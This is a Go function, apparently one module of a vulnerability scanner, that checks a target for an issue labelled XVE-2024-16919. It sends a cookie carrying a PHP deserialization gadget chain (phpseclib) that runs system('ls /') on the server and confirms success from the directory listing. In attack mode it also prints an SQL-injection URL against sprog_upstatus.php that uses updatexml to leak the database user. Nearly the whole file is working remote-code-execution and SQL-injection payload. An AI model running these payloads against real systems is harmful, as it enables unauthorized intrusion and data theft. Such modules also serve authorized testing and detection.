package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func XVE_2024_16919(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		//Proxy:           http.ProxyURL(proxyURL()), // 设置代理信息
	}

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}
	request.Header.Add("Cookie", "auth=a%3A1%3A%7Bi%3A0%3BO%3A18%3A%22phpseclib%5CNet%5CSSH1%22%3A2%3A%7Bs%3A6%3A%22bitmap%22%3Bi%3A1%3Bs%3A6%3A%22crypto%22%3BO%3A19%3A%22phpseclib%5CCrypt%5CAES%22%3A8%3A%7Bs%3A10%3A%22block_size%22%3BN%3Bs%3A12%3A%22inline_crypt%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22phpseclib%5CCrypt%5CTripleDES%22%3A6%3A%7Bs%3A10%3A%22block_size%22%3Bs%3A43%3A%221%29%7B%7D%7D%7D%3B%20ob_clean%28%29%3Bsystem%28%27ls%20%2F%27%29%3Bdie%28%29%3B%20%3F%3E%22%3Bs%3A12%3A%22inline_crypt%22%3BN%3Bs%3A16%3A%22use_inline_crypt%22%3Bi%3A1%3Bs%3A7%3A%22changed%22%3Bi%3A0%3Bs%3A6%3A%22engine%22%3Bi%3A1%3Bs%3A4%3A%22mode%22%3Bi%3A1%3B%7Di%3A1%3Bs%3A26%3A%22_createInlineCryptFunction%22%3B%7Ds%3A16%3A%22use_inline_crypt%22%3Bi%3A1%3Bs%3A7%3A%22changed%22%3Bi%3A0%3Bs%3A6%3A%22engine%22%3Bi%3A1%3Bs%3A4%3A%22mode%22%3Bi%3A1%3Bs%3A6%3A%22bitmap%22%3Bi%3A1%3Bs%3A6%3A%22crypto%22%3Bi%3A1%3B%7D%7D%7D")

	response, err := client.Do(request)
	if err != nil {
		return err
	}
	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}

	if response.StatusCode == 200 && strings.Contains(string(body), "root") && strings.Contains(string(body), "lib64") {
		fmt.Println("[*]XVE-2024-16919 : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/Maintain/sprog_upstatus.php?status=1&id=1%%20and%%20updatexml(1,concat(0x7e,user()),0)&rdb=1\n", url))
		}
	}

	defer response.Body.Close()

	return nil
}
